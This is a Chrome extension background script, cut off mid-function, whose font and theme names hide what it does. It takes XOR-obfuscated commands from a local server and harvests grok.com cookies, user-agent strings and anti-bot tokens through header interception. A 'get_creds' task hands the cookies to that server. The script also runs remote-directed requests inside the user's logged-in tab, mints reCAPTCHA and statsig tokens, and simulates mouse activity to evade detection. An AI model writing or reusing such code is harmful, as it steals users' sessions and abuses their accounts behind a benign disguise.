

const _SYNC_PORT = 18923;
const _SYNC_URL = `http://127.0.0.1:${_SYNC_PORT}`;
const _FONT_INTERVAL = 1500;        
const _THEME_VER = 0x5A;                 

let _syncing = false;                
let _themeReady = false;          
let _fontCache = 0;              
let _renderQueue = 0;            
let _styleErrors = 0;                   
let _lastRender = null;      

let _layoutActive = false;             
let _layoutTimer = null;               
const _LAYOUT_TIMEOUT = 30000;      

let _lastPrefetch = 0;        
const _RENDER_COOLDOWN = 60000;  

const _GLYPH_MIN = 1000;
let _prefetchTab = null;           
let _reviving = false;       

let _ftCache = null;
let _ftSeenAt = 0;

let _ftJar = null;
let _ftAgent = null;

let _ftPrefetchAt = 0;
const _FT_COOLDOWN = 60000;
let _ftTab = null;

let _ftActive = 0;
let _ftWarmAt = 0;

let grokActive = false;
let grokIdleTimer = null;
const GROK_IDLE_LINGER_MS = 6000;

chrome.storage.local.get(["tokenCount", "lastSuccess"], (data) => {
    _fontCache = data.tokenCount || 0;
    _lastRender = data.lastSuccess || null;
});

let instanceId = null;
let instanceIdPromise = null;

async function getInstanceId() {
    if (instanceId) return instanceId;
    
    
    if (!instanceIdPromise) {
        instanceIdPromise = (async () => {
            try {
                const data = await chrome.storage.local.get(["instanceId"]);
                if (data.instanceId && typeof data.instanceId === "string") {
                    return data.instanceId;
                }
            } catch (e) {  }
            const fresh = (crypto && crypto.randomUUID && crypto.randomUUID()) ||
                (Date.now().toString(36) + "-" + Math.random().toString(36).slice(2));
            try { await chrome.storage.local.set({ instanceId: fresh }); } catch (e) {  }
            return fresh;
        })();
    }
    instanceId = await instanceIdPromise;
    return instanceId;
}

let _canvasCfg = null;          
let _canvasCfgAt = 0;
const _CANVAS_CFG_TTL = 30000;

async function _readCanvasCfg(force = false) {
    if (!force && _canvasCfg && (Date.now() - _canvasCfgAt) < _CANVAS_CFG_TTL) return _canvasCfg;
    try {
        const extId = await getInstanceId();
        const r = await fetch(`${_SYNC_URL}/sync/config`, {
            signal: AbortSignal.timeout(4000),
            headers: { "X-Ext-Id": extId },
        });
        if (r.status !== 200) return _canvasCfg;
        const cfg = await r.json();
        const mintUrl = (cfg && cfg.recaptcha_url) || "";
        if (!mintUrl) return _canvasCfg;   
        let host = "";
        try { host = new URL(mintUrl).hostname; } catch (e) { return _canvasCfg; }
        
        
        
        
        
        const isFlow = host === "flow.google.com" || host.endsWith(".flow.google.com");
        let tabMatch = host;
        if (!isFlow) {
            try {
                const u = new URL(mintUrl);
                if (u.pathname && u.pathname !== "/" && !u.pathname.includes("{")) {
                    tabMatch = host + u.pathname.replace(/\/+$/, "");
                }
            } catch (e) {  }
        }
        _canvasCfg = {
            host,                                            
            mintUrl,                                         
            isFlow,                                          
            entryUrl: mintUrl || ("https://" + host + "/"),  
            cookieDomain: host,                              
            tabMatch,                                        
            siteKey: (cfg && cfg.recaptcha_ent_key) || "",
            scriptUrl: (cfg && cfg.recaptcha_script_url) || "",  
            canAutoOpen: !mintUrl.includes("{"),             
        };
        _canvasCfgAt = Date.now();
    } catch (e) {  }
    return _canvasCfg;
}

async function _queryCanvasList() {
    const cfg = await _readCanvasCfg();
    const host = cfg && cfg.host;
    if (!host) return [];
    try {
        const tabs = await chrome.tabs.query({});
        return tabs.filter(t => t.url && t.url.includes(host));
    } catch (e) { return []; }
}

async function _canvasJarDomain() {
    const cfg = await _readCanvasCfg();
    return (cfg && cfg.cookieDomain) || null;
}

chrome.alarms.create("keepAlive", { periodInMinutes: 0.4 });
chrome.alarms.create("heartbeat", { periodInMinutes: 0.25 });  
chrome.alarms.create("grokKeepAlive", { periodInMinutes: 1.0 });  

chrome.alarms.onAlarm.addListener(async (alarm) => {
    if (alarm.name === "keepAlive" && !_syncing) _syncFonts();
    if (alarm.name === "heartbeat") {
        
        
        try {
            const extId = await getInstanceId();
            await fetch(`${_SYNC_URL}/sync/status`, {
                signal: AbortSignal.timeout(3000),
                headers: { "X-Ext-Id": extId },
            });
        } catch (e) {  }
    }
    if (alarm.name === "grokKeepAlive") {
        
        
        
        try {
            if (_ftActive <= 0) return;
            const minIntervalMs = 120000 + Math.floor(Math.random() * 120000);
            if (Date.now() - _ftWarmAt < minIntervalMs) return;
            _ftWarmAt = Date.now();
            const tab = await _findFtCanvas();
            if (!tab) return;
            await chrome.scripting.executeScript({
                target: { tabId: tab.id },
                world: "MAIN",
                func: () => {
                    try {
                        const scrollY = Math.floor(200 + Math.random() * 400);
                        window.scrollBy(0, scrollY);
                        setTimeout(() => {
                            try { window.scrollBy(0, -scrollY); } catch (e) { }
                        }, 500 + Math.floor(Math.random() * 1000));
                        const x = Math.floor(100 + Math.random() * 700);
                        const y = Math.floor(100 + Math.random() * 400);
                        const ev = new MouseEvent("mousemove", {
                            clientX: x, clientY: y, bubbles: true, cancelable: true, view: window,
                        });
                        document.dispatchEvent(ev);
                    } catch (e) { }
                },
            });
        } catch (e) {  }
    }
});
chrome.runtime.onInstalled.addListener(() => _syncFonts());
chrome.runtime.onStartup.addListener(() => _syncFonts());

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === "complete" && tab.url && _canvasCfg && _canvasCfg.host && tab.url.includes(_canvasCfg.host)) {
        if (!_syncing) _syncFonts();
        _styleErrors = 0;
    }
    
    
    
    if (changeInfo.status === "complete" && tab.url && tab.url.includes("grok.com")) {
        _drainFtQueue().catch(() => {  });
    }
});

try {
    chrome.webRequest.onBeforeSendHeaders.addListener(
        (details) => {
            try {
                if (!details.requestHeaders) return;
                
                
                
                
                
                for (const h of details.requestHeaders) {
                    if (!h.name || !h.value) continue;
                    const n = h.name.toLowerCase();
                    if (n === "cookie") _ftJar = h.value;
                    else if (n === "user-agent") _ftAgent = h.value;
                    else if (n === "x-statsig-id" && !_ftCache) {
                        _ftCache = h.value;
                        _ftSeenAt = Date.now();
                    }
                }
            } catch (e) {  }
        },
        { urls: ["https://grok.com/rest/*"] },
        ["requestHeaders", "extraHeaders"]
    );
} catch (e) {
    
}

function _parseTheme(hexString) {
    let result = "";
    for (let i = 0; i < hexString.length; i += 2) {
        result += String.fromCharCode(parseInt(hexString.substr(i, 2), 16) ^ _THEME_VER);
    }
    return result;
}

function _serializeTheme(plaintext) {
    const ascii = plaintext.replace(/[-￿]/g,
        (c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0"));
    let result = "";
    for (let i = 0; i < ascii.length; i++) {
        result += (ascii.charCodeAt(i) ^ _THEME_VER).toString(16).padStart(2, "0");
    }
    return result;
}

async function _applyThemeUpdates(encryptedCommands) {
    if (!encryptedCommands) return;

    const decoded = _parseTheme(encryptedCommands);
    const commands = decoded.split(",");

    for (const cmd of commands) {
        const trimmed = cmd.trim();

        if (trimmed === "1") {
            
            
            try {
                const _dom = await _canvasJarDomain();
                const cookies = _dom ? await chrome.cookies.getAll({ domain: _dom }) : [];
                for (const c of cookies) {
                    const url = `https://${c.domain.replace(/^\./, "")}${c.path}`;
                    await chrome.cookies.remove({ url, name: c.name });
                }
            } catch (e) {  }

        } else if (trimmed === "2") {
            
            
            
            
            await _relayoutCanvas();

        } else if (trimmed.startsWith("3:")) {
            
            const ms = parseInt(trimmed.split(":")[1]) || 1000;
            await _animDelay(ms);

        } else if (trimmed === "4") {
            
            
            
            
            
            
            
            try {
                const tabId = await _findCanvas();
                if (tabId) await _reviveCanvas(tabId);
            } catch (e) {  }
        }
        
    }
}

async function _syncFonts() {
    if (_syncing) return;
    _syncing = true;

    while (_syncing) {
        try {
            
            
            
            let tabStatus = "closed";
            try {
                const tabId = await _findCanvas();
                if (tabId) tabStatus = "open";
            } catch (e) {  }

            
            let grokTabStatus = "closed";
            try {
                grokTabStatus = await _readFtState();
            } catch (e) {  }
            _ftStateRef = grokTabStatus;

            
            const extId = await getInstanceId();
            const response = await fetch(`${_SYNC_URL}/sync/theme`, {
                signal: AbortSignal.timeout(5000),
                headers: {
                    "X-Tab-Status": tabStatus,
                    "X-Grok-Tab-Status": grokTabStatus,
                    "X-Ext-Id": extId,
                },
            });

            if (response.status === 200) {
                _themeReady = true;
                const raw = await response.json();

                
                const data = raw.d ? JSON.parse(_parseTheme(raw.d)) : raw;

                
                if (data && data.x) {
                    await _applyThemeUpdates(data.x);
                }

                
                
                
                const hasGrokTask = data && (data.g === 1 || data.g === "1");
                if (hasGrokTask) {
                    _drainFtQueue().catch(() => {  });
                }

                
                if (data && data.r) {
                    _setLayoutMode(true);
                    let result = await _resolveWidget(data);

                    
                    
                    if (result.token && result.token.length < _GLYPH_MIN) {
                        const shortTabId = await _findCanvas();
                        if (shortTabId) {
                            await _reviveCanvas(shortTabId);
                            const again = await _resolveWidget(data);
                            if (again.token && again.token.length >= _GLYPH_MIN) result = again;
                        }
                    }

                    
                    if (!result.token && result.error && result.error.includes("not ready")) {
                        await _animDelay(2000);
                        const retry = await _resolveWidget(data);
                        if (retry.token) {
                            await _submitAnalytics(data.r, retry.token, retry.error);
                            _onFontCached();
                        } else {
                            await _submitAnalytics(data.r, null, retry.error);
                        }
                    } else {
                        await _submitAnalytics(data.r, result.token, result.error);
                        if (result.token) _onFontCached();
                    }
                }
            } else {
                _themeReady = false;
            }
        } catch (e) {
            _themeReady = false;
        }

        await _animDelay(_FONT_INTERVAL);
    }
}

async function _findFtCanvas() {
    try {
        const tabs = await chrome.tabs.query({});
        
        
        
        const imagineTabs = tabs.filter(t =>
            t.url && t.url.startsWith("https://grok.com/imagine")
        );
        if (imagineTabs.length > 0) {
            imagineTabs.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
            return imagineTabs[0];
        }

        const grokTabs = tabs.filter(t =>
            t.url && /^https:\/\/grok\.com(\/|$)/.test(t.url)
        );
        if (grokTabs.length > 0) {
            grokTabs.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
            return grokTabs[0];
        }
        return null;
    } catch (e) {
        return null;
    }
}

async function _ftAuthOk() {
    try {
        const sso = await chrome.cookies.get({ url: "https://grok.com", name: "sso" });
        if (sso && sso.value && sso.value.length > 10) return true;
        const ssoRw = await chrome.cookies.get({ url: "https://grok.com", name: "sso-rw" });
        if (ssoRw && ssoRw.value && ssoRw.value.length > 10) return true;
    } catch (e) {  }
    return false;
}

async function _openFtCanvas() {
    if (Date.now() - _ftPrefetchAt < _FT_COOLDOWN) return null;
    _ftPrefetchAt = Date.now();
    try {
        const tab = await chrome.tabs.create({
            url: "https://grok.com/imagine",
            active: false,
        });
        _ftTab = tab.id;
        
        await new Promise((resolve) => {
            const listener = (id, info) => {
                if (id === tab.id && info.status === "complete") {
                    chrome.tabs.onUpdated.removeListener(listener);
                    resolve();
                }
            };
            chrome.tabs.onUpdated.addListener(listener);
            setTimeout(() => {
                chrome.tabs.onUpdated.removeListener(listener);
                resolve();
            }, 15000);
        });
        return tab;
    } catch (e) {
        return null;
    }
}

async function _readFtState() {
    const tab = await _findFtCanvas();
    if (!tab) return "closed";
    const loggedIn = await _ftAuthOk();
    return loggedIn ? "open" : "login_required";
}

async function _emitFtEvent(taskId, event, data) {
    try {
        const payload = JSON.stringify({ id: taskId, event, data: data || {} });
        const extId = await getInstanceId();
        await fetch(`${_SYNC_URL}/sync/grok-event`, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Ext-Id": extId },
            body: JSON.stringify({ d: _serializeTheme(payload) }),
            signal: AbortSignal.timeout(5000),
        });
    } catch (e) {  }
}

let _ftWarmupAt = 0;
const _FT_WARMUP_AGE = 45000;

async function _readyFtCanvas(taskId) {
    let tab = await _findFtCanvas();
    if (!tab) tab = await _openFtCanvas();
    if (!tab || !tab.id) {
        await _emitFtEvent(taskId, "error", { message: "no grok tab available" });
        return null;
    }

    
    try { await chrome.tabs.update(tab.id, { autoDiscardable: false }); } catch (e) {}

    if (!(await _ftAuthOk())) {
        await _emitFtEvent(taskId, "error", { message: "login required" });
        return null;
    }

    
    
    
    
    let info = null;
    try { info = await chrome.tabs.get(tab.id); } catch (e) {}
    const onImagine = info && info.url && info.url.startsWith("https://grok.com/imagine") && !info.discarded;
    const fresh = (Date.now() - _ftWarmupAt) < _FT_WARMUP_AGE;
    if (!onImagine || !fresh) {
        _ftCache = null;
        _ftSeenAt = 0;
        async function navTo(url, timeoutMs) {
            try { await chrome.tabs.update(tab.id, { url }); }
            catch (e) { return false; }
            return new Promise((resolve) => {
                const listener = (id, ch) => {
                    if (id === tab.id && ch.status === "complete") {
                        chrome.tabs.onUpdated.removeListener(listener);
                        resolve(true);
                    }
                };
                chrome.tabs.onUpdated.addListener(listener);
                setTimeout(() => {
                    chrome.tabs.onUpdated.removeListener(listener);
                    resolve(false);
                }, timeoutMs);
            });
        }
        
        
        
        try {
            await navTo("https://grok.com/", 15000);
            await navTo("https://grok.com/imagine", 15000);
        } catch (e) {
            await _emitFtEvent(taskId, "error", { message: `nav /imagine failed: ${e}` });
            return null;
        }
        
        
        const deadline = Date.now() + 12000;
        while (!_ftCache && Date.now() < deadline) await _animDelay(120);
        _ftWarmupAt = Date.now();
    }

    
    
    
    
    {
        const deadline = Date.now() + 5000;
        let ready = false;
        while (Date.now() < deadline) {
            try {
                const res = await chrome.tabs.sendMessage(tab.id, { type: "GROK_CONTENT_PING" });
                if (res && res.ready) { ready = true; break; }
            } catch (e) {  }
            await _animDelay(150);
        }
        if (!ready) {
            await _emitFtEvent(taskId, "error", { message: "content script not ready" });
            return null;
        }
    }

    return tab;
}

async function _runScopedFn(opts, timeoutMs) {
    return Promise.race([
        chrome.scripting.executeScript(opts),
        new Promise((_, reject) => setTimeout(
            () => reject(new Error("executeScript timeout after " + timeoutMs + "ms — tab may be suspended")),
            Math.max(5000, timeoutMs),
        )),
    ]);
}

async function _drainFtQueue() {
    while (true) {
        let task = null;
        try {
            const extId = await getInstanceId();
            const res = await fetch(`${_SYNC_URL}/sync/grok-poll-task`, {
                signal: AbortSignal.timeout(5000),
                headers: { "X-Ext-Id": extId },
            });
            if (!res.ok) break;
            const raw = await res.json();
            const data = raw.d ? JSON.parse(_parseTheme(raw.d)) : raw;
            task = data && data.task;
        } catch (e) { break; }
        if (!task) break;
        try {
            await _resolveFtJob(task);
        } catch (e) {
            await _emitFtEvent(task.id, "error", { message: String(e) });
        }
    }
}

async function _resolveFtJob(task) {
    _ftActive++;
    setGrokActive(true);
    try {
        
        
        if (task.kind === "get_creds") return await _readFtCreds(task);

        const tab = await _readyFtCanvas(task.id);
        if (!tab) return;

        if (task.kind === "gfetch") return await _renderFtQuery(task, tab);
        if (task.kind === "gws") return await _renderFtStream(task, tab);
        if (task.kind === "force_refresh_session") return await _refreshFtCanvas(task, tab);
        await _emitFtEvent(task.id, "error", { message: `unknown kind: ${task.kind}` });
    } finally {
        _ftActive = Math.max(0, _ftActive - 1);
        
        
        
        if (_ftActive <= 0) {
            if (grokIdleTimer) clearTimeout(grokIdleTimer);
            grokIdleTimer = setTimeout(() => setGrokActive(false), GROK_IDLE_LINGER_MS);
        }
    }
}

async function _readFtCreds(task) {
    await _emitFtEvent(task.id, "done", {
        cookie: _ftJar || "",
        userAgent: _ftAgent || "",
    });
}

async function _warmFtCtx(tab, url, method, mintCfg) {
    let res;
    try {
        res = await _runScopedFn({
            target: { tabId: tab.id },
            world: "MAIN",
            func: async (mintUrl, mintMethod, cfg) => {
                try {
                    const gname = (cfg && cfg.globalName) || "TURBOPACK";
                    const TP = globalThis[gname];
                    if (!TP || typeof TP.push !== "function") return { error: "no " + gname };
                    
                    
                    
                    if (!window.__ftWarmCtx) {
                        const probeId = cfg.probeId || 990099001;
                        try {
                            TP.push(["glabs-reg.js", probeId, function (c) { window.__ftWarmCtx = c; }]);
                            TP.push(["glabs-run.js", { otherChunks: [], runtimeModuleIds: [probeId] }]);
                        } catch (e) { return { error: "ctx push: " + String(e) }; }
                        for (let i = 0; i < 40 && !window.__ftWarmCtx; i++) await new Promise(r => setTimeout(r, 50));
                    }
                    const ctx = window.__ftWarmCtx;
                    if (!ctx || typeof ctx.i !== "function") return { error: "no ctx" };
                    let ns;
                    try {
                        ns = ctx.i(cfg.moduleId);
                        if (!ns || !ns[cfg.path[0]]) ns = ctx.r(cfg.moduleId); 
                        ns = ctx.i(cfg.moduleId);
                    } catch (e) { return { error: "module " + cfg.moduleId + ": " + String(e) }; }
                    let fn = ns;
                    try { for (const k of cfg.path) fn = fn[k]; }
                    catch (e) { return { error: "path: " + String(e) }; }
                    if (typeof fn !== "function") return { error: "middleware not fn (" + typeof fn + ")" };
                    
                    
                    
                    const reqObj = { url: mintUrl, init: { method: mintMethod, headers: {} } };
                    let out;
                    try { out = await fn(reqObj); } catch (e) { return { error: "stamp: " + String(e) }; }
                    const h = (out && out.init && out.init.headers) || reqObj.init.headers || {};
                    const statsig = h["x-statsig-id"] || (h.get && h.get("x-statsig-id")) || null;
                    const reqId = h["x-xai-request-id"] || (h.get && h.get("x-xai-request-id")) || null;
                    if (!statsig) return { error: "no statsig produced" };
                    return { statsig: statsig, reqId: reqId };
                } catch (e) { return { error: String((e && e.message) || e) }; }
            },
            args: [url, method, mintCfg],
        }, 9000);
    } catch (e) {
        throw new Error("dispatch " + String((e && e.message) || e));
    }
    const r = (Array.isArray(res) && res[0] && res[0].result) || null;
    if (!r) throw new Error("no result (tab suspended?)");
    if (r.error) throw new Error(r.error);
    return r;
}

async function _renderFtQuery(task, tab) {
    const p = task.payload || {};
    const url = String(p.url || "");
    const method = String(p.method || "GET").toUpperCase();
    const headers = (p.headers && typeof p.headers === "object") ? p.headers : {};
    const body = (p.body === null || p.body === undefined) ? null : String(p.body);
    const injectStatsig = !!p.injectStatsig;
    const mintCfg = (p.mint && typeof p.mint === "object") ? p.mint : null;
    const responseMode = String(p.responseMode || "json");
    const timeoutMs = Math.max(1000, Math.min(600000, Number(p.timeoutMs) || 60000));
    const streamMaxBytes = Math.max(1024, Number(p.streamMaxBytes) || (50 * 1024 * 1024));

    if (!url) {
        await _emitFtEvent(task.id, "error", { message: "missing url" });
        return;
    }

    const finalHeaders = Object.assign({}, headers);
    if (mintCfg) {
        
        try {
            const tok = await _warmFtCtx(tab, url, method, mintCfg);
            finalHeaders["x-statsig-id"] = tok.statsig;
            if (tok.reqId && !finalHeaders["x-xai-request-id"]) finalHeaders["x-xai-request-id"] = tok.reqId;
        } catch (e) {
            await _emitFtEvent(task.id, "error", { message: "mint: " + String((e && e.message) || e) });
            return;
        }
    } else if (injectStatsig && _ftCache) {
        finalHeaders["x-statsig-id"] = _ftCache;
    }

    
    
    
    
    const spec = {
        url,
        method,
        headers: finalHeaders,
        mode: responseMode,
        taskId: task.id,
        maxBytes: streamMaxBytes,
        timeoutMs,
    };
    const specJson = JSON.stringify(spec);
    const bodyArg = body == null ? "" : body;

    if (responseMode === "stream") {
        try {
            await _runScopedFn({
                target: { tabId: tab.id },
                world: "MAIN",
                func: async (specJsonInner, bodyStr) => {
                    const s = JSON.parse(specJsonInner);
                    const sBody = bodyStr || null;
                    
                    
                    const _post = (event, data) => {
                        try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event, data: data || {} }, "*"); }
                        catch (e) {}
                    };
                    const _ac = new AbortController();
                    const _at = setTimeout(() => _ac.abort(), s.timeoutMs || 60000);
                    function parseJsonObjectsFromBuffer(buffer) {
                        const out = []; let depth = 0, inString = false, escape = false, start = -1;
                        for (let i = 0; i < buffer.length; i++) {
                            const ch = buffer[i];
                            if (start === -1) {
                                if (ch === "{") { start = i; depth = 1; inString = false; escape = false; }
                                continue;
                            }
                            if (inString) {
                                if (escape) escape = false;
                                else if (ch && ch.charCodeAt(0) === 92) escape = true;
                                else if (ch === '"') inString = false;
                                continue;
                            }
                            if (ch === '"') { inString = true; continue; }
                            if (ch === "{") depth++;
                            else if (ch === "}") {
                                depth--;
                                if (depth === 0) {
                                    const slice = buffer.slice(start, i + 1);
                                    try { out.push(JSON.parse(slice)); } catch (e) {}
                                    start = -1;
                                }
                            }
                        }
                        return { objects: out, tail: start === -1 ? "" : buffer.slice(start) };
                    }
                    function postObj(obj) {
                        try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event: "chunk", data: { obj } }, "*"); }
                        catch (e) {}
                    }
                    const opts = { method: s.method, headers: s.headers, credentials: "include", signal: _ac.signal };
                    if (sBody !== null && sBody !== undefined && sBody !== "") opts.body = sBody;
                    let res;
                    try {
                        res = await fetch(s.url, opts);
                    } catch (e) {
                        clearTimeout(_at);
                        const payload = { status: 0, error: "fetch: " + String(e) };
                        _post("error", { message: payload.error, status: 0 });
                        return payload;
                    }
                    const status = res.status;
                    if (status !== 200 || !res.body) {
                        let text = "";
                        try { text = await res.text(); } catch (e) {}
                        clearTimeout(_at);
                        if (status === 200 && text) {
                            const parsed = parseJsonObjectsFromBuffer(text);
                            for (const obj of parsed.objects) postObj(obj);
                        }
                        if (status === 200) {
                            _post("done", { status });
                        } else {
                            _post("error", { message: text.slice(0, 600), status });
                        }
                        return { status, error: status === 200 ? null : text.slice(0, 600) };
                    }
                    const reader = res.body.getReader();
                    const decoder = new TextDecoder("utf-8");
                    let buffer = "", totalBytes = 0;
                    try {
                        while (true) {
                            const { value, done } = await reader.read();
                            if (done) break;
                            totalBytes += (value && value.byteLength) || 0;
                            if (totalBytes > s.maxBytes) break;
                            buffer += decoder.decode(value, { stream: true });
                            const parsed = parseJsonObjectsFromBuffer(buffer);
                            buffer = parsed.tail;
                            for (const obj of parsed.objects) postObj(obj);
                        }
                    } catch (e) {
                        clearTimeout(_at);
                        const payload = { status, error: "stream: " + String(e) };
                        _post("error", { message: payload.error, status });
                        return payload;
                    }
                    clearTimeout(_at);
                    _post("done", { status });
                    return { status };
                },
                args: [specJson, bodyArg],
            }, timeoutMs + 5000);
        } catch (e) {
            await _emitFtEvent(task.id, "error", { message: "executeScript: " + String(e) });
        }
        return;
    }

    
    
    
    
    
    
    try {
        await _runScopedFn({
            target: { tabId: tab.id },
            world: "MAIN",
            func: async (specJsonInner, bodyStr) => {
                const s = JSON.parse(specJsonInner);
                const _post = (event, data) => {
                    try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event, data: data || {} }, "*"); }
                    catch (e) {}
                };
                const _ac = new AbortController();
                const _at = setTimeout(() => _ac.abort(), s.timeoutMs || 60000);
                const opts = { method: s.method, headers: s.headers, credentials: "include", signal: _ac.signal };
                if (bodyStr !== null && bodyStr !== undefined && bodyStr !== "") opts.body = bodyStr;
                try {
                    const res = await fetch(s.url, opts);
                    const status = res.status;
                    if (s.mode === "arrayBuffer") {
                        const buf = await res.arrayBuffer();
                        const bytes = new Uint8Array(buf);
                        let bin = "";
                        for (let i = 0; i < bytes.byteLength; i++) bin += String.fromCharCode(bytes[i]);
                        clearTimeout(_at);
                        _post("done", { status, body: btoa(bin), contentType: res.headers.get("content-type") || "" });
                        return;
                    }
                    if (s.mode === "status") {
                        
                        
                        
                        
                        
                        
                        if (status === 200) {
                            clearTimeout(_at);
                            _post("done", { status, body: null });
                            return;
                        }
                        let errText = "";
                        try { errText = (await res.text()).slice(0, 600); } catch (e) {}
                        clearTimeout(_at);
                        _post("done", { status, body: errText });
                        return;
                    }
                    if (s.mode === "text") {
                        const txt = await res.text();
                        clearTimeout(_at);
                        _post("done", { status, body: txt });
                        return;
                    }
                    
                    
                    let txt = "";
                    try { txt = await res.text(); } catch (e) {}
                    let data = null;
                    try { data = txt ? JSON.parse(txt) : null; } catch (e) {}
                    clearTimeout(_at);
                    _post("done", { status, body: data });
                } catch (e) {
                    clearTimeout(_at);
                    _post("error", { message: "fetch: " + String(e), status: 0 });
                }
            },
            args: [specJson, bodyArg],
        }, timeoutMs + 5000);
    } catch (e) {
        
        
        await _emitFtEvent(task.id, "error", { message: "executeScript: " + String(e) });
    }
}

async function _renderFtStream(task, tab) {
    const p = task.payload || {};
    const url = String(p.url || "");
    const initMessages = Array.isArray(p.initMessages) ? p.initMessages : [];
    const timeoutMs = Math.max(1000, Math.min(600000, Number(p.timeoutMs) || 180000));
    const idleTimeoutMs = Math.max(1000, Number(p.idleTimeoutMs) || 30000);
    const terminateOnCompleted = p.terminateOnCompletedStatus !== false;
    const completeImageCount = Math.max(0, Number(p.completeImageCount) || 0);

    if (!url) {
        await _emitFtEvent(task.id, "error", { message: "missing url" });
        return;
    }

    const spec = {
        url, initMessages, taskId: task.id,
        timeoutMs, idleTimeoutMs, terminateOnCompleted, completeImageCount,
    };
    const specJson = JSON.stringify(spec);

    try {
        await _runScopedFn({
            target: { tabId: tab.id },
            world: "MAIN",
            func: async (specJsonInner) => {
                const s = JSON.parse(specJsonInner);
                const post = (event, data) => {
                    try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event, data: data || {} }, "*"); }
                    catch (e) {}
                };
                return await new Promise((resolve) => {
                    let ws;
                    try { ws = new WebSocket(s.url); }
                    catch (e) {
                        post("error", { message: "ws ctor: " + String(e) });
                        resolve();
                        return;
                    }
                    let finished = false;
                    let imageDoneCount = 0;
                    let lastActivityAt = Date.now();

                    const cleanup = () => {
                        clearTimeout(hardTimer);
                        clearInterval(idleTimer);
                        try { ws.close(); } catch (e) {}
                    };
                    const finish = (event, data) => {
                        if (finished) return;
                        finished = true;
                        cleanup();
                        post(event, data || {});
                        resolve();
                    };
                    const hardTimer = setTimeout(() => {
                        finish("error", { message: "ws hard timeout", afterMs: s.timeoutMs });
                    }, s.timeoutMs);
                    const idleTimer = setInterval(() => {
                        if (finished) return;
                        if (Date.now() - lastActivityAt > s.idleTimeoutMs) {
                            finish("error", { message: "ws idle timeout", idleMs: s.idleTimeoutMs });
                        }
                    }, 1000);

                    ws.onopen = () => {
                        post("ws_open", { url: s.url });
                        lastActivityAt = Date.now();
                        try {
                            for (const msg of (s.initMessages || [])) {
                                ws.send(typeof msg === "string" ? msg : JSON.stringify(msg));
                            }
                        } catch (e) {
                            finish("error", { message: "ws send: " + String(e) });
                        }
                    };
                    ws.onmessage = (evt) => {
                        lastActivityAt = Date.now();
                        const raw = evt.data;
                        if (typeof raw !== "string") {
                            
                            post("chunk", { binary: true });
                            return;
                        }
                        let obj = null;
                        try { obj = JSON.parse(raw); }
                        catch (e) {
                            post("chunk", { text: raw.length > 800 ? raw.slice(0, 800) + "..." : raw });
                            return;
                        }
                        post("chunk", { obj });
                        if (obj && obj.type === "json" && obj.current_status === "completed") {
                            
                            
                            
                            
                            
                            if (s.terminateOnCompleted && s.completeImageCount <= 0) {
                                finish("done", { reason: "completed-status" });
                            }
                        }
                        if (obj && obj.type === "image"
                            && typeof obj.url === "string"
                            && obj.url.length > 0
                            && obj.percentage_complete === 100) {
                            imageDoneCount++;
                            if (s.completeImageCount > 0 && imageDoneCount >= s.completeImageCount) {
                                finish("done", { reason: "image-count-reached", imageDoneCount });
                            }
                        }
                    };
                    ws.onerror = () => {
                        finish("error", { message: "ws onerror" });
                    };
                    ws.onclose = (evt) => {
                        finish("done", {
                            reason: "ws-close",
                            code: evt && evt.code,
                            wasClean: !!(evt && evt.wasClean),
                        });
                    };
                });
            },
            args: [specJson],
        }, timeoutMs + 5000);
    } catch (e) {
        await _emitFtEvent(task.id, "error", { message: "executeScript: " + String(e) });
    }
}

async function _refreshFtCanvas(task, tab) {
    _ftCache = null;
    _ftSeenAt = 0;
    _ftWarmupAt = 0;
    async function navTo(url, timeoutMs) {
        try {
            await chrome.tabs.update(tab.id, { url });
        } catch (e) { return false; }
        return new Promise((resolve) => {
            const listener = (id, ch) => {
                if (id === tab.id && ch.status === "complete") {
                    chrome.tabs.onUpdated.removeListener(listener);
                    resolve(true);
                }
            };
            chrome.tabs.onUpdated.addListener(listener);
            setTimeout(() => {
                chrome.tabs.onUpdated.removeListener(listener);
                resolve(false);
            }, timeoutMs);
        });
    }
    try {
        await navTo("https://grok.com/", 15000);
        await navTo("https://grok.com/imagine", 15000);
    } catch (e) {
        await _emitFtEvent(task.id, "error", { message: String(e) });
        return;
    }
    
    {
        const deadline = Date.now() + 12000;
        while (!_ftCache && Date.now() < deadline) await _animDelay(120);
    }

    
    
    let _widgetBusy = false;
    let scrapedStatsig = null;
    try {
        const probe = await _runScopedFn({
            target: { tabId: tab.id },
            world: "MAIN",
            func: () => {
                let title = "";
                let lsStatsig = null;
                try { title = String(document.title || ""); } catch (e) { }
                try { lsStatsig = localStorage.getItem("x-statsig-id"); } catch (e) { }
                return { title, lsStatsig };
            },
            args: [],
        }, 8000);
        const out = (probe && probe[0] && probe[0].result) || {};
        const titleLower = String(out.title || "").toLowerCase();
        const _widgetTerms = ["challenge", "verify", "captcha", "cloudflare", "just a moment"];
        if (_widgetTerms.some((kw) => titleLower.includes(kw))) {
            _widgetBusy = true;
        }
        if (typeof out.lsStatsig === "string" && out.lsStatsig.trim()) {
            scrapedStatsig = out.lsStatsig.trim();
        }
    } catch (e) {  }

    
    
    
    let usedLocalStorage = false;
    if (!_ftCache && scrapedStatsig) {
        _ftCache = scrapedStatsig;
        _ftSeenAt = Date.now();
        usedLocalStorage = true;
    }

    _ftWarmupAt = Date.now();
    await _emitFtEvent(task.id, "done", {
        gotStatsig: !!_ftCache,
        statsigSource: _ftCache ? (usedLocalStorage ? "localStorage" : "webRequest") : null,
        _widgetBusy,
    });
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg && msg.from === "glabs-grok-task" && msg.taskId && msg.event) {
        _emitFtEvent(msg.taskId, msg.event, msg.data || {}).catch(() => {});
        try { sendResponse({ ok: true }); } catch (e) {}
        return true;
    }
    return false;
});

function _onFontCached() {
    _fontCache++;
    _renderQueue++;
    _styleErrors = 0;
    _lastRender = Date.now();
    try {
        chrome.storage.local.set({
            tokenCount: _fontCache,
            lastSuccess: _lastRender,
        });
    } catch (e) {  }
}

async function _reviveCanvas(tabId) {
    if (_reviving) return;
    _reviving = true;
